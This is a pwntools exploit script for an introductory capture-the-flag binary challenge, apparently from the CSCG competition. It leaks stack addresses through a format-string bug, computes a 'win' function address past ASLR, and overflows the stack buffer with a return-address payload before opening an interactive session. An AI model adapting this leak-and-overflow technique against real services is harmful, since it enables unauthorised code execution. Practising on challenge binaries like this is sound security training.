from pwn import *
from pwnlib.util.cyclic import cyclic, cyclic_find

p = process("./pwn1")
# p = remote("7b000000dd33a908ce29336d-intro-pwn-1.challenge.broker.cscg.live", 31337, ssl=True)

greeting = p.recv()

print(greeting)

fmtstring = "%p "*50
p.sendline(fmtstring)

result = p.recv()
result = result.split()[8:]
print(result)

win = 0x0000557ead3e09ec
printfaddr = 0x557ead3e09e9 

offset = printfaddr - win

new_printfaddr = int(result[36], 16)
new_win = new_printfaddr - offset

# print("new win addr: {}".format(hex(new_win)))
input("attach gdb")

# buf = b"Expelliarmus\x00" + cyclic(500)

index = cyclic_find("cnaa")

ret_addr = int(hex(new_win)[:-3] + "77e", 16)

buf = b"Expelliarmus\x00" + cyclic(index) + p64(ret_addr) + p64(new_win)

p.sendline(buf)


p.interactive()